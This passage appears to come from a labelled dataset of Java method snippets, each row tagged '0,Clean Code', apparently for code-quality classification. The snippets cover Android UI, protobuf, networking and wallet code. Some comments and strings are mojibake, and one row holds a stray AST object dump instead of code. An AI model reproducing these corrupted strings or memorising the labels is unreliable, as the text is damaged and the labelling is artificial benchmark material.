    return keyPreviewView;
  }
  keyPreviewView=mFreeKeyPreviewViews.poll();
  if (keyPreviewView != null) {
    return keyPreviewView;
  }
  final Context context=placerView.getContext();
  keyPreviewView=new KeyPreviewView(context,null);
  keyPreviewView.setBackgroundResource(mParams.mPreviewBackgroundResId);
  placerView.addView(keyPreviewView,ViewLayoutUtils.newLayoutParam(placerView,0,0));
  return keyPreviewView;
}",0,Clean Code
"@Override public void onSearchExpand(){
  searching=true;
  if (switchItem != null) {
    switchItem.setVisibility(View.GONE);
  }
  if (proxyItem != null && proxyItemVisible) {
    proxyItem.setVisibility(View.GONE);
  }
  if (downloadsItem != null && downloadsItemVisible) {
    downloadsItem.setVisibility(View.GONE);
  }
  if (scanItem != null) {
    scanItem.setVisibility(View.VISIBLE);
  }
  if (viewPages[0] != null) {
    if (searchString != null) {
      viewPages[0].listView.hide();
      if (searchViewPager != null) {
        searchViewPager.searchListView.show();
      }
    }
    if (!onlySelect) {
      floatingButtonContainer.setVisibility(View.GONE);
    }
  }
  setScrollY(0);
  updatePasscodeButton();
  updateProxyButton(false,false);
  actionBar.setBackButtonContentDescription(LocaleController.getString(""AccDescrGoBack"",R.string.AccDescrGoBack));
  NotificationCenter.getGlobalInstance().postNotificationName(NotificationCenter.needCheckSystemBarColors);
  ((SizeNotifierFrameLayout)fragmentView).invalidateBlur();
}",0,Clean Code
"/** 
 * ResultSet.getObject() returns an Integer object for an INT column.  The setter method for the property might take an Integer or a primitive int. This method returns true if the value can be successfully passed into the setter method.  Remember, Method.invoke() handles the unwrapping of Integer into an int.
 * @param value The value to be passed into the setter method.
 * @param type The setter's parameter type (non-null)
 * @return boolean True if the value is compatible (null => true)
 */
private boolean isCompatibleType(Object value,Class<?> type){
  if (value == null || type.isInstance(value)) {
    return true;
  }
 else   if (type.equals(Integer.TYPE) && value instanceof Integer) {
    return true;
  }
 else   if (type.equals(Long.TYPE) && value instanceof Long) {
    return true;
  }
 else   if (type.equals(Double.TYPE) && value instanceof Double) {
    return true;
  }
 else   if (type.equals(Float.TYPE) && value instanceof Float) {
    return true;
  }
 else   if (type.equals(Short.TYPE) && value instanceof Short) {
    return true;
  }
 else   if (type.equals(Byte.TYPE) && value instanceof Byte) {
    return true;
  }
 else   if (type.equals(Character.TYPE) && value instanceof Character) {
    return true;
  }
 else   if (type.equals(Boolean.TYPE) && value instanceof Boolean) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public Avatar clear(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  firstMetTimestamp=0L;
  dressedSkinId=0;
  promotion=0;
  equipmentUniqueId=0;
  exp=0;
  level=0;
  baseAvatarId=0;
  rank=0;
  isMarked=false;
  takenRewards.clear();
  skilltreeList.clear();
  equipRelicList.clear();
  return this;
}",0,Clean Code
"/** 
 * Converts this bit string to a hex string, such as ""7AB"".
 */
public String toHexString(){
  byte[] bytes=getAsByteArray();
  String s=ConversionUtil.toStringFromByteArray(bytes,16);
switch (bitCount % 8) {
case 1:
case 2:
case 3:
case 4:
    return s.substring(1);
case 5:
case 6:
case 7:
case 0:
  return s;
}
if ((bitCount % 8) == 4) {
return s.substring(1);
}
 else {
return s;
}
}",0,Clean Code
"default void visit(ClickHouseBinaryComparisonOperation op){
}
default void visit(ClickHouseBinaryLogicalOperation op){
}
default void visit(ClickHouseUnaryPrefixOperation exp){
}
default void visit(ClickHouseUnaryPostfixOperation op){
}
default void visit(ClickHouseConstant c){
}
default void visit(ClickHouseSelect s,boolean inner){
}
default void visit(ClickHouseColumnReference columnReference){
}
default void visit(ClickHouseExpression.ClickHousePostfixText op){
}
void visit(ClickHouseTableReference tableReference);
void visit(ClickHouseCastOperation cast);
void visit(ClickHouseAliasOperation alias);
void visit(ClickHouseExpression.ClickHouseJoin join);
void visit(ClickHouseAggregate aggregate);
void visit(ClickHouseBinaryFunctionOperation func);
default void visit(ClickHouseExpression expr){
  if (expr instanceof ClickHouseBinaryFunctionOperation) {
    visit((ClickHouseBinaryFunctionOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryComparisonOperation) {
    visit((ClickHouseBinaryComparisonOperation)expr);
  }
 else   if (expr instanceof ClickHouseBinaryLogicalOperation) {
    visit((ClickHouseBinaryLogicalOperation)expr);
  }
 else   if (expr instanceof ClickHouseConstant) {
    visit((ClickHouseConstant)expr);
  }
 else   if (expr instanceof ClickHouseUnaryPrefixOperation) {
    visit((ClickHouseUnaryPrefixOperation)expr);
  }
 else   if (expr instanceof ClickHouseSelect) {
    visit((ClickHouseSelect)expr,true);
  }
 else   if (expr instanceof ClickHouseColumnReference) {
    visit((ClickHouseColumnReference)expr);
  }
 else   if (expr instanceof ClickHouseTableReference) {
    visit((ClickHouseTableReference)expr);
  }
 else   if (expr instanceof ClickHouseCastOperation) {
    visit((ClickHouseCastOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoin) {
    visit((ClickHouseExpression.ClickHouseJoin)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHousePostfixText) {
    visit((ClickHouseExpression.ClickHousePostfixText)expr);
  }
 else   if (expr instanceof ClickHouseAggregate) {
    visit((ClickHouseAggregate)expr);
  }
 else   if (expr instanceof ClickHouseAliasOperation) {
    visit((ClickHouseAliasOperation)expr);
  }
 else   if (expr instanceof ClickHouseExpression.ClickHouseJoinOnClause) {
    visit((ClickHouseExpression.ClickHouseJoinOnClause)expr);
  }
 else {
    throw new AssertionError(expr);
  }
}
",0,Clean Code
"private int getLedColor(){
  int color=0xff0000ff;
switch (currentType) {
case TYPE_PRIVATE:
    color=getNotificationsSettings().getInt(""MessagesLed"",color);
  break;
case TYPE_GROUP:
color=getNotificationsSettings().getInt(""GroupLed"",color);
break;
case TYPE_STORIES:
color=getNotificationsSettings().getInt(""StoriesLed"",color);
break;
case TYPE_CHANNEL:
color=getNotificationsSettings().getInt(""ChannelLed"",color);
break;
case TYPE_REACTIONS_MESSAGES:
case TYPE_REACTIONS_STORIES:
color=getNotificationsSettings().getInt(""ReactionsLed"",color);
break;
}
for (int a=0; a < 9; a++) {
if (TextColorCell.colorsToSave[a] == color) {
color=TextColorCell.colors[a];
break;
}
}
return color;
}",0,Clean Code
"@Override public void onBindViewHolder(@NonNull RecyclerView.ViewHolder holder,int position){
switch (getItemViewType(position)) {
case TYPE_INFO:
    TextInfoPrivacyCell infoCell=(TextInfoPrivacyCell)holder.itemView;
  infoCell.setTextColor(Theme.getColor(Theme.key_windowBackgroundWhiteGrayText4));
if (isChannel) {
  infoCell.setText(ChatObject.isChannelAndNotMegaGroup(currentChat) ? LocaleController.getString(""EnableReactionsChannelInfo"",R.string.EnableReactionsChannelInfo) : LocaleController.getString(""EnableReactionsGroupInfo"",R.string.EnableReactionsGroupInfo));
}
 else {
  infoCell.setForeground(Theme.getThemedDrawableByKey(getContext(),R.drawable.greydivider_bottom,Theme.key_windowBackgroundGrayShadow));
  if (selectedType == SELECT_TYPE_SOME) {
    infoCell.setText(LocaleController.getString(""EnableSomeReactionsInfo"",R.string.EnableSomeReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_ALL) {
    infoCell.setText(LocaleController.getString(""EnableAllReactionsInfo"",R.string.EnableAllReactionsInfo));
  }
 else   if (selectedType == SELECT_TYPE_NONE) {
    infoCell.setText(LocaleController.getString(""DisableReactionsInfo"",R.string.DisableReactionsInfo));
  }
}
break;
case TYPE_HEADER:
HeaderCell headerCell=(HeaderCell)holder.itemView;
headerCell.setText(LocaleController.getString(""OnlyAllowThisReactions"",R.string.OnlyAllowThisReactions));
headerCell.setBackgroundColor(Theme.getColor(Theme.key_windowBackgroundWhite));
break;
case TYPE_REACTION:
AvailableReactionCell reactionCell=(AvailableReactionCell)holder.itemView;
TLRPC.TL_availableReaction react=availableReactions.get(position - (isChannel ? 2 : 3));
reactionCell.bind(react,chatReactions.contains(react.reaction),currentAccount);
break;
}
}",0,Clean Code
"/** 
 * @param context The Context the view is running in, through which it can access the currenttheme, resources, etc.
 * @param layoutId ID for an XML layout resource to load (e.g., * <code>R.layout.main_page</code>)
 */
public GlViewGroup(Context context,int layoutId){
  super(context);
  this.canvasRenderer=new CanvasRenderer();
  LayoutInflater.from(context).inflate(layoutId,this);
  measure(ViewGroup.LayoutParams.WRAP_CONTENT,ViewGroup.LayoutParams.WRAP_CONTENT);
  int width=getMeasuredWidth();
  int height=getMeasuredHeight();
  Assertions.checkState(width > 0 && height > 0);
  canvasRenderer.setSize(width,height);
  setLayoutParams(new FrameLayout.LayoutParams(width,height));
}",0,Clean Code
"@Test public void test2SpliceInsertCommands(){
  byte[] rawSpliceInsertCommand1=new byte[]{0,(byte)0x80,0x19,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0e,0x05,0x00,0x00,0x00,0x42,0x00,0x40,(byte)0x80,0x00,0x00,0x00,0x00,0x00,0x10,0x01,0x02,0x00,0x00,0x00,0x00};
  Metadata metadata=feedInputBuffer(rawSpliceInsertCommand1,2000000,3000000);
  assertThat(metadata.length()).isEqualTo(1);
  SpliceInsertCommand command=(SpliceInsertCommand)metadata.get(0);
  assertThat(command.spliceEventId).isEqualTo(66);
  assertThat(command.spliceEventCancelIndicator).isFalse();
  assertThat(command.outOfNetworkIndicator).isFalse();
  assertThat(command.programSpliceFlag).isTrue();
  assertThat(command.spliceImmediateFlag).isFalse();
  assertThat(command.programSplicePlaybackPositionUs).isEqualTo(3000000);
  assertThat(command.breakDurationUs).isEqualTo(TIME_UNSET);
  assertThat(command.uniqueProgramId).isEqualTo(16);
  assertThat(command.availNum).isEqualTo(1);
  assertThat(command.availsExpected).isEqualTo(2);
  byte[] rawSpliceInsertCommand2=new byte[]{0,(byte)0x80,0x22,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x13,0x05,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,0x00,0x00,0x02,0x10,(byte)0x81,(byte)0xff,(byte)0xff,(byte)0xff,(byte)0xff,0x11,0x00,0x00,0x20,0x01,0x02,0x00,0x00,0x00,0x00};
  long subsampleOffset=1000011;
  metadata=feedInputBuffer(rawSpliceInsertCommand2,1000000,subsampleOffset);
  assertThat(metadata.length()).isEqualTo(1);
  command=(SpliceInsertCommand)metadata.get(0);
  assertThat(command.spliceEventId).isEqualTo(0xffffffffL);
  assertThat(command.spliceEventCancelIndicator).isFalse();
  assertThat(command.outOfNetworkIndicator).isFalse();
  assertThat(command.programSpliceFlag).isFalse();
  assertThat(command.spliceImmediateFlag).isFalse();
  assertThat(command.programSplicePlaybackPositionUs).isEqualTo(TIME_UNSET);
  assertThat(command.breakDurationUs).isEqualTo(TIME_UNSET);
  List<SpliceInsertCommand.ComponentSplice> componentSplices=command.componentSpliceList;
  assertThat(componentSplices).hasSize(2);
  assertThat(componentSplices.get(0).componentTag).isEqualTo(16);
  assertThat(componentSplices.get(0).componentSplicePlaybackPositionUs).isEqualTo(1000000);
  assertThat(componentSplices.get(1).componentTag).isEqualTo(17);
  assertThat(componentSplices.get(1).componentSplicePts).isEqualTo(TIME_UNSET);
  assertThat(command.uniqueProgramId).isEqualTo(32);
  assertThat(command.availNum).isEqualTo(1);
  assertThat(command.availsExpected).isEqualTo(2);
}",0,Clean Code
"@java.lang.Override public void writeTo(com.google.protobuf.CodedOutputStream output) throws java.io.IOException {
  getSerializedSize();
  if (metadata_ != null) {
    output.writeMessage(1,getMetadata());
  }
  if (getClusterLabelsList().size() > 0) {
    output.writeUInt32NoTag(18);
    output.writeUInt32NoTag(clusterLabelsMemoizedSerializedSize);
  }
  for (int i=0; i < clusterLabels_.size(); i++) {
    output.writeInt32NoTag(clusterLabels_.getInt(i));
  }
  if (outlierScoresVector_ != null) {
    output.writeMessage(3,getOutlierScoresVector());
  }
  if (distance_ != null) {
    output.writeMessage(4,getDistance());
  }
  for (int i=0; i < clusterExemplars_.size(); i++) {
    output.writeMessage(5,clusterExemplars_.get(i));
  }
  if (java.lang.Double.doubleToRawLongBits(noisePointsOutlierScore_) != 0) {
    output.writeDouble(6,noisePointsOutlierScore_);
  }
  unknownFields.writeTo(output);
}",0,Clean Code
"private void tunnel(){
  try {
    HttpDestination destination=(HttpDestination)context.get(HttpClientTransport.HTTP_DESTINATION_CONTEXT_KEY);
    this.context.put(""ssl.peer.host"",destination.getHost());
    this.context.put(""ssl.peer.port"",destination.getPort());
    ClientConnectionFactory connectionFactory=this.connectionFactory;
    if (destination.isSecure()) {
      connectionFactory=newSslClientConnectionFactory(destination.getHttpClient(),null,connectionFactory);
    }
    Connection newConnection=connectionFactory.newConnection(getEndPoint(),context);
    getEndPoint().upgrade(newConnection);
    if (LOG.isDebugEnabled()) {
      LOG.debug(""SOCKS5 tunnel established: {} over {}"",this,newConnection);
    }
  }
 catch (  Throwable x) {
    fail(x);
  }
}",0,Clean Code
"@Override protected Task<WalletAndKey> createTask(){
  return new Task<>(){
    protected WalletAndKey call() throws IOException, StorageException {
      WalletAndKey walletAndKey;
      if (password != null) {
        walletAndKey=storage.loadEncryptedWallet(password);
        password.clear();
      }
 else {
        walletAndKey=storage.loadUnencryptedWallet();
      }
      return walletAndKey;
    }
  }
;
}
@Override protected Task<ECKey> createTask(){
  return new Task<>(){
    protected ECKey call() throws IOException, StorageException {
      try {
        ECKey encryptionFullKey=storage.getEncryptionKey(password);
        if (verifyPassword && !ECKey.fromPublicOnly(encryptionFullKey).equals(storage.getEncryptionPubKey())) {
          throw new InvalidPasswordException(""Derived pubkey does not match stored pubkey"");
        }
        return encryptionFullKey;
      }
  finally {
        password.clear();
      }
    }
  }
;
}
@Override protected Task<Wallet> createTask(){
  return new Task<>(){
    protected Wallet call() throws IOException, StorageException {
      try {
        wallet.decrypt(password);
        return wallet;
      }
  finally {
        password.clear();
      }
    }
  }
;
}
@Override protected Task<Void> createTask(){
  return new Task<>(){
    protected Void call(){
      persistence.close();
      return null;
    }
  }
;
}
@Override protected Task<Void> createTask(){
  return new Task<>(){
    protected Void call() throws IOException, ExportException {
      Sparrow export=new Sparrow();
      try (BufferedOutputStream outputStream=new BufferedOutputStream(new FileOutputStream(newWalletFile))){
        export.exportWallet(wallet,outputStream,null);
      }
       return null;
    }
  }
;
}
@Override protected Task<Boolean> createTask(){
  return new Task<>(){
    protected Boolean call(){
      return storage.delete(deleteBackups);
    }
  }
;
}
",0,Clean Code
"public JSONObject listPagination(Long appId,String user,String page,String pageSize,String stageIdWhiteList,String optionKey,String optionValue) throws IOException, ApiException {
  JSONObject payload=new JSONObject();
  if (appId != null) {
    payload.put(""appId"",appmanagerId(appId));
  }
  if (stageIdWhiteList != null) {
    payload.put(""stageIdWhiteList"",stageIdWhiteList);
  }
  if (optionKey != null) {
    payload.put(""optionKey"",optionKey);
  }
  if (optionValue != null) {
    payload.put(""optionValue"",optionValue);
  }
  payload.put(""page"",page);
  payload.put(""pageSize"",pageSize);
  return new Requests(AppmanagerServiceUtil.getEndpoint() + ""/deployments"").params(payload).headers(HttpHeaderNames.X_EMPL_ID,user).get().isSuccessful().getJSONObject().getJSONObject(""data"");
}
",0,Clean Code
"/** 
 * React to a code input. It may be a code point to insert, or a symbolic value that influences the keyboard behavior. Typically, this is called whenever a key is pressed on the software keyboard. This is not the entry point for gesture input; see the onBatchInput* family of functions for this.
 * @param settingsValues the current settings values.
 * @param event the event to handle.
 * @param keyboardShiftMode the current shift mode of the keyboard, as returned by{@link org.dslul.openboard.inputmethod.keyboard.KeyboardSwitcher#getKeyboardShiftMode()}
 * @return the complete transaction object
 */
public InputTransaction onCodeInput(final SettingsValues settingsValues,@Nonnull final Event event,final int keyboardShiftMode,final int currentKeyboardScriptId,final LatinIME.UIHandler handler){
  mWordBeingCorrectedByCursor=null;
  final Event processedEvent=mWordComposer.processEvent(event);
  final InputTransaction inputTransaction=new InputTransaction(settingsValues,processedEvent,SystemClock.uptimeMillis(),mSpaceState,getActualCapsMode(settingsValues,keyboardShiftMode));
  if (processedEvent.getMKeyCode() != Constants.CODE_DELETE || inputTransaction.getMTimestamp() > mLastKeyTime + Constants.LONG_PRESS_MILLISECONDS) {
    mDeleteCount=0;
  }
  mLastKeyTime=inputTransaction.getMTimestamp();
  mConnection.beginBatchEdit();
  if (!mWordComposer.isComposingWord()) {
    mIsAutoCorrectionIndicatorOn=false;
  }
  if (processedEvent.getMCodePoint() != Constants.CODE_SPACE) {
    cancelDoubleSpacePeriodCountdown();
  }
  Event currentEvent=processedEvent;
  while (null != currentEvent) {
    if (currentEvent.isConsumed()) {
      handleConsumedEvent(currentEvent,inputTransaction);
    }
 else     if (currentEvent.isFunctionalKeyEvent()) {
      handleFunctionalEvent(currentEvent,inputTransaction,currentKeyboardScriptId,handler);
    }
 else {
      handleNonFunctionalEvent(currentEvent,inputTransaction,handler);
    }
    currentEvent=currentEvent.getMNextEvent();
  }
  if (!mConnection.hasSlowInputConnection() && !mWordComposer.isComposingWord() && (settingsValues.isWordCodePoint(processedEvent.getMCodePoint()) || processedEvent.getMKeyCode() == Constants.CODE_DELETE)) {
    mWordBeingCorrectedByCursor=getWordAtCursor(settingsValues,currentKeyboardScriptId);
  }
  if (!inputTransaction.didAutoCorrect() && processedEvent.getMKeyCode() != Constants.CODE_SHIFT && processedEvent.getMKeyCode() != Constants.CODE_CAPSLOCK && processedEvent.getMKeyCode() != Constants.CODE_SWITCH_ALPHA_SYMBOL)   mLastComposedWord.deactivate();
  if (Constants.CODE_DELETE != processedEvent.getMKeyCode()) {
    mEnteredText=null;
  }
  mConnection.endBatchEdit();
  return inputTransaction;
}",0,Clean Code
"private MeanVarianceProto(com.google.protobuf.GeneratedMessageV3.Builder<?> builder){
  super(builder);
}
private MeanVarianceProto(){
}
!org.eclipse.jdt.core.dom.MethodDeclaration@71f2d822",0,Clean Code
"@Override public void run(){
  String defaultLogTag=Logger.getDefaultLogTag();
  boolean loggingEnabled=Logger.shouldEnableLoggingForCustomLogLevel(mLogLevel);
  if (loggingEnabled)   Logger.logVerbose(LOG_TAG,""Using custom log level: "" + mLogLevel + "", current log level: ""+ Logger.getLogLevel());
  try {
    String line;
    while ((line=reader.readLine()) != null) {
      if (loggingEnabled)       Logger.logVerboseForce(defaultLogTag + ""Command"",String.format(Locale.ENGLISH,""[%s] %s"",shell,line));
      if (stringWriter != null)       stringWriter.append(line).append(""\n"");
      if (listWriter != null)       listWriter.add(line);
      if (lineListener != null)       lineListener.onLine(line);
      while (!active) {
synchronized (this) {
          try {
            this.wait(128);
          }
 catch (          InterruptedException e) {
          }
        }
      }
    }
  }
 catch (  IOException e) {
    if (streamClosedListener != null) {
      calledOnClose=true;
      streamClosedListener.onStreamClosed();
    }
  }
  try {
    reader.close();
  }
 catch (  IOException e) {
  }
  if (!calledOnClose) {
    if (streamClosedListener != null) {
      calledOnClose=true;
      streamClosedListener.onStreamClosed();
    }
  }
}",0,Clean Code
"/** 
 * 鍒ゆ柇jsonschema鐨勫弬鏁版槸鍚︿竴鏍�
 * @param jsonSchema       鏁版嵁搴撲腑鐨勬暟鎹�
 * @param importJsonSchema 瀵煎叆鐨勭敓鎴愮殑jsonschema
 * @return true 涓�鏍� false 涓嶄竴鏍� 涓�鏍风殑璇濆氨涓嶉渶瑕佹洿鏂�
 */
private static boolean jsonSchemaIsSame(JsonSchemaItem jsonSchema,JsonSchemaItem importJsonSchema){
  boolean same=true;
  if (jsonSchema == null && importJsonSchema == null) {
    return true;
  }
  if (jsonSchema != null && !StringUtils.equals(jsonSchema.getType(),importJsonSchema.getType())) {
    return false;
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.OBJECT)) {
    Map<String,JsonSchemaItem> properties=jsonSchema.getProperties();
    Map<String,JsonSchemaItem> importProperties=importJsonSchema.getProperties();
    if (MapUtils.isNotEmpty(properties) || MapUtils.isNotEmpty(importProperties)) {
      List<String> dbJsonKeys=properties.keySet().stream().toList();
      List<String> importJsonKeys=importProperties.keySet().stream().toList();
      if (keysHasDifferent(dbJsonKeys,importJsonKeys)) {
        return false;
      }
      for (      String key : dbJsonKeys) {
        JsonSchemaItem jsonSchemaItem=properties.get(key);
        JsonSchemaItem importJsonSchemaItem=importProperties.get(key);
        if (!jsonSchemaIsSame(jsonSchemaItem,importJsonSchemaItem)) {
          same=false;
          break;
        }
      }
    }
  }
  if (jsonSchema != null && StringUtils.equals(jsonSchema.getType(),PropertyConstant.ARRAY)) {
    JsonSchemaItem items=jsonSchema.getItems();
    JsonSchemaItem importItems=importJsonSchema.getItems();
    if (items != null && importItems != null) {
      if (!jsonSchemaIsSame(items,importItems)) {
        return false;
      }
    }
  }
  return same;
}
",0,Clean Code
"/** 
 * Clears the map and reduces the size of the backing arrays to be the specified capacity / loadFactor, if they are larger.
 */
public void clear(int maximumCapacity){
  int tableSize=tableSize(maximumCapacity,loadFactor);
  if (keyTable.length <= tableSize) {
    clear();
    return;
  }
  size=0;
  resize(tableSize);
}
public void clear(){
  if (size == 0) {
    return;
  }
  size=0;
  ObjectArray.clearObjectArray(keyTable,0,keyTable.length);
  ObjectArray.clearObjectArray(valueTable,0,valueTable.length);
}",0,Clean Code
"@Override public void drawOnScrimWithScale(Canvas canvas,float scale){
  final View panel=mBottomSheetBackground;
  final boolean hasBottomSheet=panel.getVisibility() == VISIBLE;
  final float translationY=((View)panel.getParent()).getTranslationY();
  final float horizontalScaleOffset=(1 - scale) * panel.getWidth() / 2;
  final float verticalScaleOffset=(1 - scale) * (panel.getHeight() - getHeight() / 2);
  final float topNoScale=panel.getTop() + translationY;
  final float topWithScale=topNoScale + verticalScaleOffset;
  final float leftWithScale=panel.getLeft() + horizontalScaleOffset;
  final float rightWithScale=panel.getRight() - horizontalScaleOffset;
  if (hasBottomSheet) {
    mHeaderPaint.setColor(mBottomSheetBackgroundColor);
    mHeaderPaint.setAlpha((int)(255 * mBottomSheetAlpha));
    mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,panel.getBottom());
    mTmpPath.reset();
    mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
    canvas.drawPath(mTmpPath,mHeaderPaint);
  }
  if (DEBUG_HEADER_PROTECTION) {
    mHeaderPaint.setColor(Color.MAGENTA);
    mHeaderPaint.setAlpha(255);
  }
 else {
    mHeaderPaint.setColor(mHeaderColor);
    mHeaderPaint.setAlpha((int)(getAlpha() * Color.alpha(mHeaderColor)));
  }
  if (mHeaderPaint.getColor() == mScrimColor || mHeaderPaint.getColor() == 0) {
    return;
  }
  final float headerBottomNoScale=getHeaderBottom() + getVisibleContainerView().getPaddingTop();
  final float headerHeightNoScale=headerBottomNoScale - topNoScale;
  final float headerBottomWithScaleOnTablet=topWithScale + headerHeightNoScale * scale;
  final float headerBottomOffset=(getVisibleContainerView().getHeight() * (1 - scale) / 2);
  final float headerBottomWithScaleOnPhone=headerBottomNoScale * scale + headerBottomOffset;
  final FloatingHeaderView headerView=getFloatingHeaderView();
  if (hasBottomSheet) {
    if (!isSearchBarFloating() || mUsingTabs) {
      mTmpRectF.set(leftWithScale,topWithScale,rightWithScale,headerBottomWithScaleOnTablet);
      mTmpPath.reset();
      mTmpPath.addRoundRect(mTmpRectF,mBottomSheetCornerRadii,Direction.CW);
      canvas.drawPath(mTmpPath,mHeaderPaint);
    }
  }
 else {
    canvas.drawRect(0,0,canvas.getWidth(),headerBottomWithScaleOnPhone,mHeaderPaint);
  }
  final int tabsHeight=headerView.getPeripheralProtectionHeight();
  if (mTabsProtectionAlpha > 0 && tabsHeight != 0) {
    if (DEBUG_HEADER_PROTECTION) {
      mHeaderPaint.setColor(Color.BLUE);
      mHeaderPaint.setAlpha(255);
    }
 else {
      mHeaderPaint.setAlpha((int)(getAlpha() * mTabsProtectionAlpha));
    }
    float left=0f;
    float right=canvas.getWidth();
    if (hasBottomSheet) {
      left=mBottomSheetBackground.getLeft() + horizontalScaleOffset;
      right=mBottomSheetBackground.getRight() - horizontalScaleOffset;
    }
    final float tabTopWithScale=hasBottomSheet ? headerBottomWithScaleOnTablet : headerBottomWithScaleOnPhone;
    final float tabBottomWithScale=tabTopWithScale + tabsHeight * scale;
    canvas.drawRect(left,tabTopWithScale,right,tabBottomWithScale,mHeaderPaint);
  }
}",0,Clean Code
"public static void copyFolder(String sourcePath,String targetPath) throws Exception {
  File sourceFile=new File(sourcePath);
  File targetFile=new File(targetPath);
  if (!sourceFile.exists()) {
    throw new Exception(""鏂囦欢澶逛笉瀛樺湪"");
  }
  if (!sourceFile.isDirectory()) {
    throw new Exception(""婧愭枃浠跺す涓嶆槸鐩綍"");
  }
  if (!targetFile.exists()) {
    targetFile.mkdirs();
  }
  if (!targetFile.isDirectory()) {
    throw new Exception(""鐩爣鏂囦欢澶逛笉鏄洰褰�"");
  }
  File[] files=sourceFile.listFiles();
  if (files == null || files.length == 0) {
    return;
  }
  for (  File file : files) {
    String movePath=targetFile + File.separator + file.getName();
    if (file.isDirectory()) {
      copyFolder(file.getAbsolutePath(),movePath);
    }
 else {
      BufferedInputStream in=new BufferedInputStream(new FileInputStream(file));
      BufferedOutputStream out=new BufferedOutputStream(new FileOutputStream(movePath));
      byte[] b=new byte[1024];
      int temp=0;
      while ((temp=in.read(b)) != -1) {
        out.write(b,0,temp);
      }
      out.close();
      in.close();
    }
  }
}",0,Clean Code
"/** 
 * Returns the translation X value for view when it goes out of the scene 
 */
float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  return view.getTranslationX();
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final boolean isRtl=sceneRoot.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL;
  final float x;
  if (isRtl) {
    x=view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
 else {
    x=view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
  return x;
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final boolean isRtl=sceneRoot.getLayoutDirection() == View.LAYOUT_DIRECTION_RTL;
  final float x;
  if (isRtl) {
    x=view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
 else {
    x=view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
  return x;
}
@Override public float getGoneX(FadeAndShortSlide t,ViewGroup sceneRoot,View view,int[] position){
  final int viewCenter=position[0] + view.getWidth() / 2;
  sceneRoot.getLocationOnScreen(position);
  Rect center=t.getEpicenter();
  final int sceneRootCenter=center == null ? (position[0] + sceneRoot.getWidth() / 2) : center.centerX();
  if (viewCenter < sceneRootCenter) {
    return view.getTranslationX() - t.getHorizontalDistance(sceneRoot);
  }
 else {
    return view.getTranslationX() + t.getHorizontalDistance(sceneRoot);
  }
}",0,Clean Code
"public LayoutParams(Context c,AttributeSet attrs){
  super(c,attrs);
}
public LayoutParams(int width,int height){
  super(width,height);
}
public LayoutParams(int width,int height,int gravity){
  super(width,height,gravity);
}
public LayoutParams(ViewGroup.LayoutParams p){
  super(p);
}
public LayoutParams(MarginLayoutParams source){
  super(source);
}
@RequiresApi(19) public LayoutParams(FrameLayout.LayoutParams source){
  super(source);
}",0,Clean Code
"public static void writeLog(Object msg,String level){
  Logger logger=PluginLogUtils.getLogger();
  if (DEBUG.equals(level)) {
    if (logger != null && logger.isDebugEnabled()) {
      logger.debug(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (INFO.equals(level)) {
    if (logger != null && logger.isInfoEnabled()) {
      logger.info(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (WARN.equals(level)) {
    if (logger != null && logger.isWarnEnabled()) {
      logger.warn(PluginLogUtils.getMsg(msg));
    }
  }
 else   if (ERROR.equals(level)) {
    if (logger != null && logger.isErrorEnabled()) {
      logger.error(PluginLogUtils.getMsg(msg));
    }
  }
 else {
    if (logger != null && logger.isErrorEnabled()) {
      logger.error("""");
    }
  }
}
",0,Clean Code
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.math.protos.AdaGradRDADenseTensorProto)) {
    return super.equals(obj);
  }
  org.tribuo.math.protos.AdaGradRDADenseTensorProto other=(org.tribuo.math.protos.AdaGradRDADenseTensorProto)obj;
  if (hasData() != other.hasData())   return false;
  if (hasData()) {
    if (!getData().equals(other.getData()))     return false;
  }
  if (java.lang.Double.doubleToLongBits(getLearningRate()) != java.lang.Double.doubleToLongBits(other.getLearningRate()))   return false;
  if (java.lang.Double.doubleToLongBits(getEpsilon()) != java.lang.Double.doubleToLongBits(other.getEpsilon()))   return false;
  if (java.lang.Double.doubleToLongBits(getL1()) != java.lang.Double.doubleToLongBits(other.getL1()))   return false;
  if (java.lang.Double.doubleToLongBits(getL2()) != java.lang.Double.doubleToLongBits(other.getL2()))   return false;
  if (!getGradNorms().equals(other.getGradNorms()))   return false;
  if (getIteration() != other.getIteration())   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}",0,Clean Code
"public static void setupLaf(String[] args){
  try {
    if (args.length > 0)     UIManager.setLookAndFeel(args[0]);
 else {
      String lafClassName=state.get(KEY_LAF,FlatLightLaf.class.getName());
      if (IntelliJTheme.ThemeLaf.class.getName().equals(lafClassName)) {
        String theme=state.get(KEY_LAF_THEME,"""");
        if (theme.startsWith(RESOURCE_PREFIX))         IntelliJTheme.setup(IJThemesPanel.class.getResourceAsStream(IJThemesPanel.THEMES_PACKAGE + theme.substring(RESOURCE_PREFIX.length())));
 else         if (theme.startsWith(FILE_PREFIX))         FlatLaf.setup(IntelliJTheme.createLaf(new FileInputStream(theme.substring(FILE_PREFIX.length()))));
 else         FlatLightLaf.setup();
